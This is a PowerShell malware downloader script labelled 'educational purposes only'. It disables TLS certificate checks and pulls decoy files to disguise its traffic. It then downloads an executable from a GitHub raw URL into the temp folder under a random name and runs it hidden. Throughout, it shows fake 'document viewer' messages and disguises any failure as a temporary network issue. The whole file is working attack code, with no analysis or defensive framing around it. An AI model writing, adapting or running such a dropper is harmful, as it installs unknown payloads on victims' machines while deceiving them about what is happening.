# payload.ps1 - Multi-stage payload downloader with SSL bypass
# Educational purposes only

# Bypass SSL/TLS certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Function to generate random file names for evasion
function Get-RandomFileName {
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    $name = -join ((1..10) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $name
}

# User-writable locations
$tempPath = $env:TEMP
$downloadsPath = [Environment]::GetFolderPath("Downloads")

# Download URLs
$payloadUrl = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$decoyUrls = @(
    "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/decoy1.txt",
    "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/decoy2.txt"
)

try {
    # Create legitimate-looking activity
    Write-Host "Initializing document viewer..." -ForegroundColor Yellow
    
    # Download decoy content first (creates normal-looking traffic)
    foreach ($decoyUrl in $decoyUrls) {
        try {
            $decoyFile = Join-Path $tempPath "$(Get-RandomFileName).tmp"
            Invoke-WebRequest -Uri $decoyUrl -OutFile $decoyFile -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        } catch {
            # Continue even if decoy downloads fail
        }
    }
    
    # Download main payload
    $payloadPath = Join-Path $tempPath "$(Get-RandomFileName).exe"
    
    Write-Host "Loading components..." -ForegroundColor Yellow
    
    # Download with progress simulation
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    
    # Verify download
    if (Test-Path $payloadPath) {
        # Add execution delay to avoid immediate detection
        Start-Sleep -Seconds 2
        
        # Execute payload silently
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = $payloadPath
        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processStartInfo.CreateNoWindow = $true
        $processStartInfo.UseShellExecute = $false
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processStartInfo
        $process.Start() | Out-Null
        
        # Clean up traces after execution
        Start-Sleep -Seconds 1
        
        Write-Host "Document loaded successfully." -ForegroundColor Green
    } else {
        Write-Host "Error: Failed to load document components." -ForegroundColor Red
    }
    
} catch {
    # Error handling that appears normal to user
    Write-Host "Temporary network issue. Please try again." -ForegroundColor Red
}

# Final cleanup of any temporary decoy files
Get-ChildItem $tempPath -Filter "*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
